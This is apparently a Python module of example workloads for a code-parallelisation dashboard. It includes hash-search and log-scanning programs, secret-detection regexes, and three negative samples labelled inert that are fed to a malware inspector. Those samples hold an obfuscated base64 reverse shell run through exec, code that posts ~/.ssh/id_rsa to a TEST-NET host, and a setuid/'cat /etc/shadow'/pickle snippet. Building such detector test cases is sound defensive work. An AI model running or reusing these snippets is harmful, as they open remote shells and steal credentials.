"""Example programs for the dashboard: the SRS reference workloads (Section 2.6) and negative samples.

The positive workloads (W1-W5 and the extra GO samples) read input files that the Master Server
generates deterministically (:func:`example_inputs`), and are CPU-heavy enough per item that a
cluster run can show a speedup (NFR-1.4). The malicious samples are inert: they are only ever
parsed by the inspector, never executed, and use TEST-NET addresses (RFC 5737).
"""

from __future__ import annotations

import functools
import hashlib
import json
import random
from pathlib import Path

_SAMPLES = Path(__file__).resolve().parents[1] / "examples"


def _sample(name: str) -> str:
    path = _SAMPLES / name
    return path.read_text(encoding="utf-8") if path.exists() else f"# missing sample {name}\n"


ROUNDS = 120      # key-stretching rounds in W2 / W5 (CPU work per word)
_WORDS = 40000


def _stretch(word: str, rounds: int = ROUNDS) -> str:
    h = word
    for _ in range(rounds):
        h = hashlib.md5(h.encode()).hexdigest()
    return h


@functools.lru_cache(maxsize=None)
def _wordlist() -> tuple[str, ...]:
    rnd = random.Random(7)
    letters = "abcdefghijklmnopqrstuvwxyz"
    return tuple("".join(rnd.choice(letters) for _ in range(rnd.randint(5, 10))) for _ in range(_WORDS))


@functools.lru_cache(maxsize=None)
def _target() -> str:
    return _stretch(_wordlist()[int(_WORDS * 0.7)])


@functools.lru_cache(maxsize=None)
def example_inputs(name: str) -> dict[str, bytes]:
    """Input files of an example program (the Master owns all input data, SRS 5.3.4)."""
    rnd = random.Random(11)
    levels = ["INFO"] * 6 + ["WARN", "ERROR", "DEBUG"]
    if name in ("w1_keyword_search.py",):
        lines = []
        for i in range(200000):
            msg = f"user={rnd.randint(1, 5000)} took {rnd.randint(1, 900)}ms path=/api/v{rnd.randint(1, 3)}/item"
            if i % 997 == 0:
                msg += f" token=AKIA{rnd.randint(10**15, 10**16 - 1)}"
            lines.append(f"2026-11-27T10:{i % 60:02d}:{i % 59:02d} {rnd.choice(levels)} {msg}")
        return {"server.log": ("\n".join(lines) + "\n").encode()}
    if name in ("w2_hash_search.py", "w5_threaded_hash.py"):
        return {"wordlist.txt": ("\n".join(_wordlist()) + "\n").encode()}
    if name == "w3_log_scan.py":
        files = {}
        for f in range(24):
            rows = [f"{rnd.choice(levels)} {rnd.randint(1, 10**6)} request id={rnd.randint(1, 10**9)}"
                    for _ in range(6000)]
            files[f"logs/app{f:02d}.log"] = ("\n".join(rows) + "\n").encode()
        return files
    if name == "w4_sort.py":
        return {"numbers.json": json.dumps([rnd.randint(0, 10**9) for _ in range(300000)]).encode()}
    return {}


def _src(text: str) -> str:
    return text.replace("@TARGET@", _target()).replace("@ROUNDS@", str(ROUNDS))


EXAMPLES: dict[str, dict[str, str]] = {
    "w1_keyword_search.py": {"label": "W1 · leaked-key search in a log (list collect)", "expect": "GO", "source": '''\
import re

PATTERNS = [r"token=AKIA[0-9]{16}", r"password=\\S+", r"secret[_-]?key", r"BEGIN RSA PRIVATE KEY",
            r"ghp_[A-Za-z0-9]{36}", r"xox[bap]-[0-9A-Za-z-]+", r"api[_-]?key=\\w+", r"Bearer [A-Za-z0-9.]+"]
lines = open("server.log").read().splitlines()
hits = []
for line in lines:
    if any(re.search(p, line, re.IGNORECASE) for p in PATTERNS):
        hits.append(line)
print(len(hits), "lines with leaked keys")
print(hits[:2])
'''},
    "w2_hash_search.py": {"label": "W2 · password hash search (first match)", "expect": "GO", "source": _src('''\
import hashlib

TARGET = "@TARGET@"
words = open("wordlist.txt").read().split()
found = None
for w in words:
    h = w
    for _ in range(@ROUNDS@):
        h = hashlib.md5(h.encode()).hexdigest()
    if h == TARGET:
        found = w
        break
print("password:", found)
''')},
    "w3_log_scan.py": {"label": "W3 · log directory scan (keyed counter)", "expect": "GO", "source": '''\
import hashlib
import os
import re

LINE = re.compile(r"^(\\w+) (\\d+) request id=(\\d+)$")
counts = {}
files = [os.path.join("logs", name) for name in sorted(os.listdir("logs"))]
for path in files:
    for line in open(path):
        m = LINE.match(line.strip())
        if m is None:
            continue
        # pseudonymise the request id; requests whose pseudonym starts with "0" are sampled separately
        token = hashlib.sha256(m.group(3).encode()).hexdigest()
        for _ in range(8):
            token = hashlib.sha256(token.encode()).hexdigest()
        key = m.group(1) + ("/sampled" if token[0] == "0" else "")
        counts[key] = counts.get(key, 0) + 1
print(sorted(counts.items()))
'''},
    "w4_sort.py": {"label": "W4 · sort a large list (two-phase sort)", "expect": "GO", "source": '''\
import json

data = json.load(open("numbers.json"))
result = sorted(data)
print(result[:5], result[-5:], len(result))
'''},
    "w4b_sort_by_key.py": {"label": "W4b · sort records by a computed key (two-phase sort)", "expect": "PARTIAL",
                           "source": '''\
import hashlib

SALT = "2026"


def priority(record):
    h = record
    for _ in range(25):
        h = hashlib.sha256((SALT + h).encode()).hexdigest()
    return (int(h[:4], 16) % 10, record)


records = [f"job-{i:06d}" for i in range(60000)]
ordered = sorted(records, key=priority)
print(ordered[:3], ordered[-3:])
'''},
    "w5_threaded_hash.py": {"label": "W5 · threaded hash check (thread group + lock)", "expect": "GO",
                            "source": _src('''\
import hashlib
import threading

TARGET = "@TARGET@"
words = open("wordlist.txt").read().split()
found = []
lock = threading.Lock()


def check(part):
    for w in part:
        h = w
        for _ in range(@ROUNDS@):
            h = hashlib.md5(h.encode()).hexdigest()
        if h == TARGET:
            with lock:
                found.append(w)


parts = [words[i::8] for i in range(8)]
threads = [threading.Thread(target=check, args=(p,)) for p in parts]
for t in threads:
    t.start()
for t in threads:
    t.join()
print(found)
''')},
    "monte_carlo_sum.py": {"label": "Numeric reduction + a sequential region (partial)", "expect": "PARTIAL",
                           "source": '''\
import math

total = 0.0
for i in range(1, 12_000_001):
    total += math.sqrt(i) / i

state = 1
for step in range(50):
    state = (state * 31 + step) % 1_000_003   # carried dependency: stays sequential (NO-GO)

print(round(total, 6), state)
'''},
    "executor_map.py": {"label": "ThreadPoolExecutor.map (Pattern B)", "expect": "GO", "source": '''\
import hashlib
from concurrent.futures import ThreadPoolExecutor


def digest(word):
    h = word
    for _ in range(300):
        h = hashlib.sha256(h.encode()).hexdigest()
    return h[:12]


words = [f"user{i}" for i in range(6000)]
with ThreadPoolExecutor(max_workers=8) as pool:
    digests = list(pool.map(digest, words))
print(len(digests), digests[0], digests[-1])
'''},
    "poc_count_primes.py": {"label": "POC · count primes (Master splits, Workers pull, Master sums)", "expect": "GO",
                            "source": _sample("poc_count_primes.py")},
    "merge_sort_cluster.py": {"label": "Merge sort with threads + lock (cluster version of thread_merge_sort.py)",
                              "expect": "PARTIAL", "source": _sample("merge_sort_cluster.py")},
    "concurrency_go.py": {"label": "Test · mutex + threads + sort (supported patterns)", "expect": "PARTIAL",
                          "source": _sample("concurrency_go.py")},
    "concurrency_test.py": {"label": "Test · mutex + sort + semaphore + threads + processes", "expect": "NOT ELIGIBLE",
                            "source": _sample("concurrency_test.py")},
    "n1_carried_dependency.py": {"label": "N1 · carried dependency", "expect": "NOT ELIGIBLE", "source": '''\
xs = list(range(1, 100))
total = 0
for i in range(len(xs)):
    total = total * xs[i] + i
print(total)
'''},
    "n2_producer_consumer.py": {"label": "N2 · queue producer/consumer", "expect": "NOT ELIGIBLE", "source": '''\
import queue
import threading

q = queue.Queue()


def producer():
    for i in range(100):
        q.put(i)
    q.put(None)


def consumer():
    while (item := q.get()) is not None:
        print(item)


threads = [threading.Thread(target=producer), threading.Thread(target=consumer)]
for t in threads:
    t.start()
for t in threads:
    t.join()
'''},
    "n4_zero_division.py": {"label": "N4 · ZeroDivisionError inside a GO region", "expect": "GO → run aborted",
                            "source": '''\
values = [5, 4, 3, 2, 1, 0, 1, 2]
out = []
for v in values:
    out.append(10 / v)
print(out)
'''},
    "n5_recursive_quicksort.py": {"label": "N5 · user-written recursive Quicksort", "expect": "NOT ELIGIBLE",
                                  "source": '''\
def quicksort(xs):
    if len(xs) <= 1:
        return xs
    pivot, rest = xs[0], xs[1:]
    return quicksort([x for x in rest if x < pivot]) + [pivot] + quicksort([x for x in rest if x >= pivot])


data = [(i * 7919) % 1000 for i in range(500)]
print(quicksort(data)[:10])
'''},
    "multiprocessing_pool.py": {"label": "multiprocessing.Pool (process-based)", "expect": "NOT ELIGIBLE",
                                "source": '''\
from multiprocessing import Pool


def square(x):
    return x * x


if __name__ == "__main__":
    with Pool(4) as pool:
        print(sum(pool.map(square, range(1000))))
'''},
    "n3_reverse_shell.py": {"label": "N3 · obfuscated reverse shell (malicious)", "expect": "MALICIOUS", "source": '''\
# INERT SAMPLE: parsed by the inspector, never executed.
import base64

PAYLOAD = "aW1wb3J0IHNvY2tldCxvcztzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKCcyMDMuMC4xMTMuNScsNDQ0NCkp"
results = []
for i in range(10):
    results.append(i * i)
getattr(__builtins__, "ex" + "ec")(base64.b64decode(PAYLOAD))
'''},
    "n3_credential_exfil.py": {"label": "N3 · credential exfiltration (malicious)", "expect": "MALICIOUS",
                               "source": '''\
# INERT SAMPLE: parsed by the inspector, never executed.
import os
import urllib.request

data = open(os.path.expanduser("~/.ssh/id_rsa")).read()
urllib.request.urlopen("http://198.51.100.7/collect", data=data.encode())
'''},
    "n3_privilege.py": {"label": "N3 · os.system / setuid / pickle (malicious)", "expect": "MALICIOUS", "source": '''\
# INERT SAMPLE: parsed by the inspector, never executed.
import os
import pickle

os.setuid(0)
os.system("cat /etc/shadow")
config = pickle.loads(open("config.bin", "rb").read())
'''},
}
